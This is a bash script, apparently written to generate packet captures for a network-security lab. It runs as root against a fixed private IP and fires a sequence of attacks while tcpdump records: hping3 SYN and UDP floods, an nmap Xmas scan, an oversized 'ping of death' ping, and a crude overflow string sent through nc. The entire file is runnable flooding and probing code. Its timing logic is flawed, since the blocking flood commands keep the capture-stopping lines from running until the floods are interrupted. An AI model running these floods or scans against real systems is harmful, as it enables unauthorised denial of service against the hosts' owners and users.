#!/bin/bash

victim_ip="192.168.50.19"
interface="eth0"

# Check if the script is running as root
if [ "$EUID" -ne 0 ]; then
  echo "This script must be run as root. Re-running with sudo..."
  sudo "$0" "$@"
  exit
fi

# TCP SYN flood attack
echo "Starting TCP SYN flood attack on $victim_ip:"
tcpdump -i eth0 -w "part3_syn_flood.pcap" &
hping3 -S -p 80 --flood $victim_ip
sleep 2
kill $!

# UDP flood attack
echo "Starting UDP flood attack on $victim_ip:"
tcpdump -i eth0 -w "part3_udp_flood.pcap" &
hping3 --udp -p 53 --flood $victim_ip
sleep 2
kill $!

# Xmas Nmap scan
echo "Starting Xmas Nmap scan on $victim_ip:"
tcpdump -i eth0 -w "part3_xmas_scan.pcap" &
nmap -sX $victim_ip
sleep 2
kill $!

# Ping of death
echo "Starting ping of death attack on $victim_ip:"
tcpdump -i eth0 -w "part3_ping_of_death.pcap" &
ping -s 65500 $victim_ip
sleep 2
kill $!

# Buffer overflow attack
echo "Starting buffer overflow attack on $victim_ip:"
tcpdump -i eth0 -w "part3_buffer_overflow.pcap" &
python3 -c 'print("A" * 1000)' | nc $victim_ip 1234
sleep 2
kill $!


